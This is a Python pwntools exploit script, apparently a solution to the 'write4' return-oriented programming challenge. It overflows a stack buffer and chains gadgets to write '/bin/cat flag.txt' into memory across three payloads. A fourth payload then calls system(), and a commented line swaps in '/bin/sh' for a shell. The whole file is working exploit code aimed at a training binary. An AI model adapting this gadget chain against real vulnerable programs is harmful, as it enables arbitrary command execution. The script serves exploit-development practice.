from pwn import *

binary = './write4'
context.log_level = "CRITICAL"
exe = context.binary = ELF(binary)
context.log_level = "DEBUG"
IO = process(binary)

s = b"/bin/cat flag.txt\x00" #length = 17 minus 0x0 18 plus 0x0
#s = b"/bin/sh\x00" #length = 17 minus 0x0 18 plus 0x0
main = p64(exe.symbols[b'main'])
pwnme = p64(exe.symbols[b'pwnme'])
write_address = p64(0x601090)
log.info(f"Write address is at {hex(u64(write_address))}")
usefullgadget = p64(0x0000000000400890) # : pop r14 ; pop r15 ; ret
padding = 40 * b'\x90'
mov_qword = p64(0x0000000000400820) # : mov qword ptr [r14], r15 ; ret
ret = p64(0x00000000004005b9)

#first payload:
s_qword = s[:8]
log.info(f'Sending text string {s_qword} to address {hex(u64(write_address))}')
payload = padding + usefullgadget + write_address + s_qword + mov_qword + ret + main
IO.recvuntil("> ")
IO.sendline(payload)

print("FIRST PAUSE")
pause()
#sending second payload:
write_address = p64(u64(write_address) + 0x8)
s_qword = s[8: 8 + 8]
log.info(f'Sending text string {s_qword} to address {hex(u64(write_address))}')
payload2 = padding + usefullgadget + write_address + s_qword + mov_qword + ret + main
IO.recvuntil("> ")
IO.sendline(payload2)

#sending third payload:
write_address = p64(u64(write_address) + 0x8)
s_qword = s[8 + 8: 8 + 8 + 8].ljust(8, b'\x00')
log.info(f'Sending text string {s_qword} to address {hex(u64(write_address))}')
payload3= padding + usefullgadget + write_address + s_qword + mov_qword + ret + main
IO.recvuntil("> ")
IO.sendline(payload3)

#sending fourth payload
system = p64(exe.plt[b'system'])
pop_rdi = p64(0x400893) #: pop rdi; ret
write_address = p64(0x601090)
payload4 = padding + pop_rdi + write_address + ret + system
IO.recvuntil("> ")
IO.sendline(payload4)
#log.info(IO.recvall(timeout=0.3))
IO.recvall(timeout=0.3).decode()
#print(hex(len(payload + payload2 + payload3 + payload4)))
#exp = payload + payload2[:40] + payload3[:40] + payload4[:40]
with open("exp.bin", 'wb') as fd:
    fd.write(payload + b'\x0A')
    fd.write(payload2 + b'\x0A')
    fd.write(payload3 + b'\x0A')
    fd.write(payload4 + b'\x0A')



